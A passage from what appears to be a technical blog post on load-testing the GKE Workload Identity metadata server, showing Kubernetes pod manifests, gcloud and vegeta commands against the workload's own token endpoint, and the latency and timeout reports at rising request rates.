<h2>Level 2</h2>

<p>Apply this one Pod</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">cat &lt;&lt;EOF | kubectl --context [CONTEXT] apply -f -</span>
</span><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Pod</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">wi-test</span>
</span><span class='line'>  <span class="l-Scalar-Plain">namespace</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span><span class="nv">K8S_NAMESPACE</span><span class="p-Indicator">]</span>
</span><span class='line'><span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">containers</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">google/cloud-sdk</span>
</span><span class='line'>    <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">wi-test</span>
</span><span class='line'>    <span class="l-Scalar-Plain">command</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span> <span class="s">&#39;/bin/bash&#39;</span><span class="p-Indicator">,</span> <span class="s">&#39;-c&#39;</span><span class="p-Indicator">,</span> <span class="s">&#39;--&#39;</span> <span class="p-Indicator">]</span>
</span><span class='line'>    <span class="l-Scalar-Plain">args</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span> <span class="s">&#39;while</span><span class="nv"> </span><span class="s">true;</span><span class="nv"> </span><span class="s">do</span><span class="nv"> </span><span class="s">sleep</span><span class="nv"> </span><span class="s">30;</span><span class="nv"> </span><span class="s">done;&#39;</span> <span class="p-Indicator">]</span>
</span><span class='line'>    <span class="l-Scalar-Plain">securityContext</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">allowPrivilegeEscalation</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">false</span>
</span><span class='line'>      <span class="l-Scalar-Plain">privileged</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">false</span>
</span><span class='line'>      <span class="l-Scalar-Plain">readOnlyRootFilesystem</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">false</span>
</span><span class='line'>    <span class="l-Scalar-Plain">resources</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">limits</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">cpu</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">2</span>
</span><span class='line'>        <span class="l-Scalar-Plain">memory</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">4G</span>
</span><span class='line'>      <span class="l-Scalar-Plain">requests</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">cpu</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">2</span>
</span><span class='line'>        <span class="l-Scalar-Plain">memory</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">4G</span>
</span><span class='line'><span class="l-Scalar-Plain">EOF</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then <code>kubectl exec</code> in and run this command.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">for i in {1..N}; do gcloud auth print-access-token &amp; done; wait;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Everything seemed to work fine when N was 100. When N was 200 I got a few errors like the below.
They look like client-side errors and not server ones though.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">ERROR</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gcloud failed to load</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">No module named &#39;ruamel.yaml.error&#39;</span>
</span><span class='line'><span class="l-Scalar-Plain">gcloud_main = _import_gcloud_main()</span>
</span><span class='line'><span class="l-Scalar-Plain">import googlecloudsdk.gcloud_main</span>
</span><span class='line'><span class="l-Scalar-Plain">from googlecloudsdk.api_lib.iamcredentials import util as iamcred_util</span>
</span><span class='line'><span class="l-Scalar-Plain">from googlecloudsdk.api_lib.util import exceptions</span>
</span><span class='line'><span class="l-Scalar-Plain">from googlecloudsdk.core.resource import resource_printer</span>
</span><span class='line'><span class="l-Scalar-Plain">from googlecloudsdk.core.resource import yaml_printer</span>
</span><span class='line'><span class="l-Scalar-Plain">from googlecloudsdk.core.yaml import dict_like</span>
</span><span class='line'><span class="l-Scalar-Plain">from googlecloudsdk.core import yaml_location_value</span>
</span><span class='line'><span class="l-Scalar-Plain">from ruamel import yaml</span>
</span><span class='line'><span class="l-Scalar-Plain">from ruamel.yaml.main import *</span> <span class="c1"># NOQA</span>
</span><span class='line'><span class="l-Scalar-Plain">from ruamel.yaml.error import UnsafeLoaderWarning, YAMLError</span> <span class="c1"># NOQA</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">This usually indicates corruption in your gcloud installation or problems with your Python interpreter.</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">Please verify that the following is the path to a working Python 2.7 or 3.5+ executable</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">/usr/bin/python3</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">If it is not, please set the CLOUDSDK_PYTHON environment variable to point to a working Python 2.7 or 3.5+ executable.</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">If you are still experiencing problems, please reinstall the Cloud SDK using the instructions here</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">https://cloud.google.com/sdk/</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">ERROR</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gcloud failed to load</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">cannot import name &#39;opentype&#39; from &#39;pyasn1.type&#39; (/usr/bin/../lib/google-cloud-sdk/lib/third_party/pyasn1/type/__init__.py)</span>
</span><span class='line'><span class="l-Scalar-Plain">from google.auth.crypt import _cryptography_rsa</span>
</span><span class='line'><span class="l-Scalar-Plain">import cryptography.exceptions</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">File &quot;/usr/bin/../lib/google-cloud-sdk/lib/gcloud.py&quot;, line 67, in main</span>
</span><span class='line'><span class="l-Scalar-Plain">File &quot;/usr/bin/../lib/google-cloud-sdk/lib/gcloud.py&quot;, line 48, in _import_gcloud_main</span>
</span><span class='line'><span class="l-Scalar-Plain">File &quot;/usr/lib/google-cloud-sdk/lib/googlecloudsdk/gcloud_main.py&quot;, line 33, in &lt;module&gt;</span>
</span><span class='line'><span class="l-Scalar-Plain">File &quot;/usr/lib/google-cloud-sdk/lib/googlecloudsdk/api_lib</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>gcloud</code> does not synchronize between processes with concurrent invokations. It sometimes writes
files to disk. So this is also not a great load test because it still doesn&rsquo;t let you achieve a
specific RPS and has client-side bottlenecks.</p>

<h2>Level 3</h2>

<p>Use a proper HTTP load testing tool. A colleague told me about <a href="https://github.com/tsenart/vegeta"><code>vegeta</code></a>.
It&rsquo;s a seemingly good tool, but, more importantly, its commands are amazing.
<code>vegeta attack ...</code>.</p>

<p>I first start a <code>golang</code> Pod that just busy-waits.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">$ cat &lt;&lt;EOF | kubectl --context [CONTEXT] apply -f -</span>
</span><span class='line'><span class="l-Scalar-Plain">&gt; apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">v1</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err"> kind: Pod</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err"> metadata:</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">   name: wi-test</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">   namespace: [NAMESPACE]</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err"> spec:</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">   containers:</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">   - image: golang:latest</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">     name: wi-test</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">     command: [ &#39;/bin/bash&#39;, &#39;-c&#39;, &#39;--&#39; ]</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">     args: [ &#39;while true; do sleep 30; done;&#39; ]</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">     resources:</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">       limits:</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">         cpu: 2</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">         memory: 4G</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">       requests:</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">         cpu: 2</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">         memory: 4G</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err"> EOF</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">pod/wi-test created</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then I get a shell in it.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">kubectl --context [CONTEXT] -n [NAMESPACE] exec -it wi-test bash</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">Defaulting container name to wi-test.</span>
</span><span class='line'><span class="l-Scalar-Plain">Use &#39;kubectl describe pod/wi-test -n [NAMESPACE]&#39; to see all of the containers in this pod.</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# go get github.com/tsenart/vegeta</span>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# vegeta -version</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">Version</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Commit</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Runtime</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">go1.14.1 linux/amd64</span>
</span><span class='line'><span class="l-Scalar-Plain">Date</span><span class="p-Indicator">:</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s throw some load on WI! <code>my-gsa@my-project.iam.gserviceaccount.com</code> is the GSA associated with
the KSA your workload runs as.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 10 -duration=5s | vegeta report</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         50, 10.20, 10.20</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             4.904s, 4.9s, 4.168ms</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  4.168ms, 6.137ms, 5.039ms, 9.591ms, 10.444ms, 31.452ms, 31.452ms</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     25300, 506.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           100.00%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      200:50</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 1000 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         5000, 1000.20, 127.51</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             31.175s, 4.999s, 26.176s</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  101.972ms, 11.003s, 7.652s, 30s, 30s, 30s, 30.001s</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     2011350, 402.27</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           79.50%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      0:1025  200:3975</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Get &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot;</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 100 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         500, 100.20, 98.40</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             5.081s, 4.99s, 91.244ms</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  3.805ms, 106.449ms, 59.058ms, 306.334ms, 372.519ms, 506.703ms, 601.534ms</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     253000, 506.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           100.00%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      200:500</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 500 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         2500, 500.20, 43.29</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             34.072s, 4.998s, 29.074s</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  10.56ms, 12.579s, 756.03ms, 30s, 30s, 30s, 30.001s</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     746350, 298.54</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           59.00%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      0:1025  200:1475</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Get &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot;</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 250 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         1250, 250.22, 28.52</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             34.996s, 4.996s, 30s</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  8.331ms, 6.347s, 376.419ms, 30s, 30s, 30s, 30.001s</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     504988, 403.99</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           79.84%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      0:252  200:998</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Get &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot;</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 200 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         1000, 200.20, 28.28</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             32.43s, 4.995s, 27.435s</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  9.985ms, 2.739s, 188.509ms, 797.058ms, 30s, 30s, 30s</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     464002, 464.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           91.70%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      0:83  200:917</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Get &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot;</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 150 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         750, 150.20, 146.53</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             5.118s, 4.993s, 125.078ms</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  3.747ms, 224.285ms, 171.325ms, 460.236ms, 549.18ms, 682.161ms, 892.25ms</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     379500, 506.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           100.00%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      200:750</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 175 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         875, 175.20, 24.46</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             34.097s, 4.994s, 29.103s</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  3.704ms, 1.687s, 231.652ms, 708.672ms, 2.432s, 30s, 30s</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     422004, 482.29</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           95.31%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      0:41  200:834</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Get &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot;</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 165 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         825, 165.20, 23.61</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             34.6s, 4.994s, 29.606s</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  3.483ms, 558.613ms, 222.111ms, 531.49ms, 622.473ms, 11.851s, 30s</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     413402, 501.09</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           99.03%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      0:8  200:817</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Get &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot;</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span>
